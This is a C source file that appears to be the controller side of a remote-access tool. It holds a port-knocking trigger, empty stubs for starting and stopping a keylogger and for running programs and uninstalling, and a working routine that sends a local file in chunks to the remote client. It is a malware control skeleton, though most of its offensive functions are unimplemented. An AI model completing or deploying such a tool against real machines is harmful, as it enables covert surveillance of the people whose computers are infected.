#include "protocol.h"
#include "networking.h"
#include "utils.h"
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#include "../../client/networking/networking.h"

void initiate_port_knocking(struct server_options * server_options) {
    send_message(server_options->client_fd, server_options->client_ip_address, PORT_KNOCKING_PORT, NULL);
}

// void handle_packet_data(struct session_info * session_info, const uint16_t data) {
//     if (session_info->packet_counter == 0) {
//         handle_command_codes(session_info, data);
//         session_info->head->data = data;
//         session_info->packet_counter++;
//         return;
//     }
//
//     struct packet_data * packet_data = session_info->head;
//
//     // Traverse to the last filled node
//     while (packet_data->next != NULL) {
//         packet_data = packet_data->next;
//     }
//
//     // Add data
//     packet_data->next = malloc(sizeof(struct packet_data));
//     packet_data->next->data = data;
//     packet_data->next->next = NULL;
//     session_info->packet_counter++;
//
//     const int clear_linked_list = handle_command_codes(session_info, data);
//
//     if (clear_linked_list) {
//         log_message("Clearing linked list");
//         clear_process_packets(session_info);
//     }
// }

void send_start_keylogger(int fd) {

}


void send_stop_keylogger(int fd) {

}

// Disconnect
void send_disconnect(int fd) {

}


void send_file(struct server_options * server_options) {

}


void receive_file(const struct server_options * server_options) {
    const size_t message_length = 1024;
    char * message = malloc(message_length);
    long bytes_read = 0;

    const int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
    if (flags == -1) {
        fprintf(stderr, "F_GETFL on STDIN\n");
        free(message);
        return;
    }

    if (fcntl(STDIN_FILENO, F_SETFL, flags & ~O_NONBLOCK) == -1) {
        fprintf(stderr, "F_SETFL on STDIN\n");
        free(message);
        return;
    }

    // Consume any leftover characters
    char discard;
    while (read(STDIN_FILENO, &discard, 1) > 0) {
        if (discard == '\n') break;
    }

    fprintf(stdout, "Enter the filename to send (i.e. /home/text.txt): ");
    fflush(stdout);

    bytes_read = read(STDIN_FILENO, message, message_length);
    if (bytes_read > 0) {
        message[bytes_read - 1] = '\0';
        printf("Reading file: %s\n", message);
        fflush(stdout);

        FILE * file = fopen(message, "rb");
        if (file == NULL) {
            fprintf(stderr, "Failed to open file: %s\n", message);
            free(message);
            fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK);
            return;
        }

        char * file_buffer = malloc(message_length);
        if (file_buffer == NULL) {
            fprintf(stderr, "Failed to allocate file buffer\n");
            fclose(file);
            free(message);
            fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK);
            return;
        }

        // Send over the filename and the FILENAME command
        send_message(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, message);

        sleep(2);
        send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, FILENAME);

        size_t chunk_count = 0;
        size_t chunk_bytes;
        while ((chunk_bytes = fread(file_buffer, 1, message_length - 1, file)) > 0) {
            file_buffer[chunk_bytes] = '\0';
            send_message(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, file_buffer);
            chunk_count++;
            printf("Sent chunk %zu (%zu bytes)\n", chunk_count, chunk_bytes);
            fflush(stdout);
        }

        printf("File transfer complete. Sent %zu chunks\n", chunk_count);
        fflush(stdout);

        fclose(file);
        free(file_buffer);
    }

    free(message);

    sleep(2);
    send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, RECEIVE_FILE);

    if (fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK) == -1) {
        fprintf(stderr, "F_SETFL on STDIN\n");
    }
}




void send_watch(int fd, enum FILE_TYPE file_type, char * path) {

}


// Run program
void send_run_program(int fd) {

}


// Uninstall
void send_uninstall(int fd) {

}



